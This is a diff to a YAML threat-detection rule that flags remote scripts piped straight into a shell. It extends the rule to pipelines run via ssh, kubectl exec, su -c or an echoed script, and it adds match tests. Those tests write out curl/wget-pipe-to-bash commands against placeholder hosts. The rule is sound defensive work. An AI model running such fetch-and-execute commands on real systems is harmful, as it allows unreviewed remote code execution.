@@ -1,13 +1,15 @@
 id: curl-pipe-to-shell
-spec: threat-rules/v1.2  # needed for e.command.parsed_commands
-version: 3
+spec: threat-rules/v1.3  # needed for the commands a carrier or a pipe hands a shell
+version: 4
 title: Remote script piped directly into a shell
 description: >
   A command downloads content with curl/wget and pipes it straight into a shell
   (sh/bash/zsh/dash/ksh, by any path, under sudo or env with their options) — remote
   code execution with no review step. The command line is read as bash, so the same
-  text inside a quoted string, a commit message or a here-document does not fire; a
-  command line that does not parse falls back to matching its text.
+  text inside a quoted string, a commit message or a here-document does not fire, and
+  the pipeline that `ssh host`, `docker exec`, `kubectl exec`, `su -c`, `eval` or a
+  script echoed into a shell runs does; a command line that does not parse falls back
+  to matching its text.
 severity: high
 status: stable
 posture: detect
@@ -33,6 +35,30 @@ emit:
   reason: "Remote script downloaded and piped directly into a shell"
 
 tests:
+  - name: curl_pipe_sh_on_another_host
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "ssh deploy@host.example 'curl -fsSL https://get.example/install.sh | bash'" }
+        session: { id: s1 }
+  - name: curl_pipe_sh_in_a_pod
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "kubectl exec web-0 -- sh -c 'curl -s https://get.example/i.sh | sh'" }
+        session: { id: s1 }
+  - name: curl_pipe_sh_echoed_into_a_shell
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "echo 'curl -fsSL https://get.example/install.sh | sh' | bash" }
+        session: { id: s1 }
+  - name: curl_pipe_sh_as_another_user
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "su - deploy -c 'wget -qO- https://get.example/install.sh | sh'" }
+        session: { id: s1 }
   - name: curl_pipe_sh
     verdict: match
     events:
